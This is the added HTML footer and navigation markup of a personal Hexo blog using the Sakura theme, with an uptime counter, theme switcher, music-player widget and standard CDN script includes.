+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 Pp1ove<br>
+      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer> -->
+<footer id="colophon" class="site-footer" role="contentinfo">
+  <div class="site-info">
+    <div class="footertext">
+      <div class="img-preload">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
+      </div>
+      <p style="color: #666666;">&copy 2021 HAPPY NEW YEAR !!!</p>
+    </div>
+       <center>
+                网站已运行:<span id="run_time" style="color:black"></span>
+            </center>
+
+            <script>
+                function runTime() {
+                    var d = new Date(), str = '';
+                    BirthDay = new Date("January 01,2021");
+                    today = new Date();
+                    timeold = (today.getTime() - BirthDay.getTime());
+                    sectimeold = timeold / 1000
+                    secondsold = Math.floor(sectimeold);
+                    msPerDay = 24 * 60 * 60 * 1000
+                    msPerYear = 365 * 24 * 60 * 60 * 1000
+                    e_daysold = timeold / msPerDay
+                    e_yearsold = timeold / msPerYear
+                    daysold = Math.floor(e_daysold);
+                    yearsold = Math.floor(e_yearsold);
+                    //str = yearsold + "年";
+                    str += daysold + "天";
+                    str += d.getHours() + '时';
+                    str += d.getMinutes() + '分';
+                    str += d.getSeconds() + '秒';
+                    return str;
+                }
+                setInterval(function () { $('#run_time').html(runTime()) }, 1000);
+            </script>
+    <div class="footer-device">
+    <p style="font-family: 'Ubuntu', sans-serif;">
+        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
+        </span>
+      </p>
+    </div>
+  </div><!-- .site-info -->
+</footer>
+
+
+
+<!-- <script src="/js/tocbot.js"></script> -->
+<script type="text/javascript" src="/js/lib.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/InsightSearch.js"></script>
+<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
+<script type="text/javascript" src="/js/zoom.min.js"></script>
+<script type="text/javascript" src="/js/sakura-app.js"></script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
+<script src="/js/botui.js"></script>
+<!-- 不蒜子 网页计数器 -->
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
+<script type="text/javascript">
+/* <![CDATA[ */
+if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  var Poi = {"pjax":"1","movies":{"url": "","name":"","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+} else {
+  var Poi = {"pjax":"1","movies":{"url": "","name":"","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+}
+/* ]]> */
+
+</script>
+
+<script>
+$(document).ready(function() {
+  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
+    if ($(".pattern-center").length > 0) { //有图的情况
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -400,
+          scrollSmoothOffset: -85
+      });
+    } else {
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -85,
+          scrollSmoothOffset: -85
+      });
+    }
+    var offsetTop = $('.toc').offset().top - 95;
+    window.onscroll = function() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
+      if (scrollTop >= offsetTop) {
+        $('.toc').addClass('toc-fixed');
+      } else {
+        $('.toc').removeClass('toc-fixed');
+      }
+    }
+  }
+});
+</script>
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js"></script>
+    <div class="openNav no-select" style="height: 50px;">
+      <div class="iconflat no-select" style="width: 50px; height: 50px;">
+        <div class="icon"></div>
+      </div>
+      <div class="site-branding search-form-submit">
+        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
+      </div>
+    </div>
+  </section>
+
+  <div class="skin-menu no-select" id="mainskin" style="position: fixed">
+ <div class="theme-controls row-container">
+  <ul class="menu-list">
+   <li id="white-bg"> <i class="fa fa-television" aria-hidden="true"></i></li>
+   <li id="sakura-bg"> <i class="iconfont icon-sakura"></i></li>
+   <li id="gribs-bg"> <i class="fa fa-slack" aria-hidden="true"></i></li>
+   <li id="KAdots-bg"> <i class="iconfont icon-dots"></i></li>
+   <li id="totem-bg"> <i class="fa fa-optin-monster" aria-hidden="true"></i></li>
+   <li id="pixiv-bg"> <i class="iconfont icon-pixiv"></i></li>
+   <li id="bing-bg"> <i class="iconfont icon-bing"></i></li>
+   <li id="dark-bg"> <i class="fa fa-moon-o" aria-hidden="true"></i></li>
+  </ul>
+ </div>
+</div>
+<canvas id="night-mode-cover"></canvas>
+ 
+  <div class="changeSkin-gear no-select">
+  <div class="keys" id="setbtn"> 
+   <span id="open-skinMenu"> 切换主题 | SCHEME TOOL  
+     <i class="iconfont icon-gear inline-block rotating"></i> 
+   </span>
+  </div>
+</div>
+
+  <div id="mo-nav" class="">
+  <div class="m-avatar">
+    <img src="/img/custom/head.jpg">
+  </div>
+  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">さくら荘そのPp1ove</p>
+  <p style="text-align: center; word-spacing: 20px;">
+    
+      
+        <a href="http://github.com/Pp1ove" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
+      
+    
+  </p>
+  <ul id="menu-new-1" class="menu">
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+            首页
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/archives">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+            归档
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/categories/技术/">
+                  <i class="fa fa-code" aria-hidden="true"></i>
+                  技术
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/复现/">
+                  <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                  复现
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/学科/">
+                  <i class="fa fa-commenting-o" aria-hidden="true"></i>
+                  学科
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/题目/">
+                  <i class="fa fa-book" aria-hidden="true"></i>
+                  题目
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="javascript:;">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+            清单
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/bangumi/">
+                  <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                  番组
+                </a>
+              </li>
+            
+              <li>
+                <a href="/music/">
+                  <i class="fa fa-headphones" aria-hidden="true"></i>
+                  歌单
+                </a>
+              </li>
+            
+              <li>
+                <a href="/tags/图集/">
+                  <i class="fa fa-photo" aria-hidden="true"></i>
+                  图集
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/comment/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
+            留言板
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/links/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
+            友人帐
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/donate/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
+            赞赏
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+            关于
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/about/">
+                  <i class="fa fa-meetup" aria-hidden="true"></i>
+                  我？
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/client/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-android faa-vertical" aria-hidden="true"></i>
+            客户端
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/atom.xml">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
+            RSS
+          </span>
+        </a>
+        
+      </li>
+    
+  </ul>
+  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
+</div>
+<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<style>
+  .aplayer .aplayer-lrc {
+    height: 35px;
+  }
+  .aplayer .aplayer-lrc p{
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 18px !important;
+  }
+  .aplayer .aplayer-lrc p.aplayer-lrc-current{
+    color: #FF1493;
+  }
+  .aplayer.aplayer-narrow .aplayer-body{
+    left: -66px !important;
+  }
+  .aplayer.aplayer-fixed .aplayer-lrc {
+    display: none;
+  }
+  .aplayer .aplayer-lrc.aplayer-lrc-hide {
+      display:none !important;
+  }
+  .aplayer.aplayer-fixed .lrc-show {
+    display: block;
+    background: rgba(255, 255, 255, 0.8);
+  }
+</style>
+<meting-js
+
+    id="5251613646"
+
+    server="netease"
+
+    type="playlist"
+
+    fixed="true"
+
+    autoplay="false"
+
+    loop="all"
+
+    order="random"
+
+    preload="auto"
+
+    volume="0.7"
+
+    mutex="true"
+
+</meting-js>
+<script>
+  $(function(){
+    $('body').on('click', '.aplayer', function(){
+      if($('.aplayer-button').hasClass('aplayer-play')) {
+        $('.aplayer-lrc').removeClass('lrc-show');
+      } else {
+        $('.aplayer-lrc').addClass('lrc-show');
+      }
+    })
+  });
+</script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>
+<script src="//instant.page/3.0.0" type="module" defer integrity="s</body>
+</html>
